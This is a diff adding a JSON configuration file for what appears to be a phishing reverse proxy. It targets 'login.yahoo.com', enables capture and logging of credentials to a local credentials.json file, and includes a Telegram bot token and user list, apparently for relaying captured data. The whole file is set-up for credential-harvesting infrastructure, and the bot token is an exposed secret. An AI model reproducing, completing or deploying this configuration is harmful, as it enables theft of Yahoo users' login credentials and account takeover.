@@ -1,0 +1,29 @@
+{
+    "proxy": {
+        "target_domain": "login.yahoo.com",
+        "listening_port": 8080,
+        "ssl_enabled": true
+    },
+    "telegram": {
+        "bot_token": "6585498694:AAH0cIcMQphU9Z4hDDWi7hcjo1MuSeEvTgQ",
+        "allowed_users": [1]
+    },
+    "capture": {
+        "enabled": true,
+        "storage_path": "./storage/captures/credentials.json",
+        "log_captures": true
+    },
+    "security": {
+        "allow_external_access": false,
+        "trusted_ips": ["127.0.0.1"],
+        "rate_limit": {
+            "max_requests": 100,
+            "window_ms": 900000
+        }
+    },
+    "logging": {
+        "level": "info",
+        "access_log": "./storage/logs/access.log",
+        "error_log": "./storage/logs/error.log"
+    }
+}
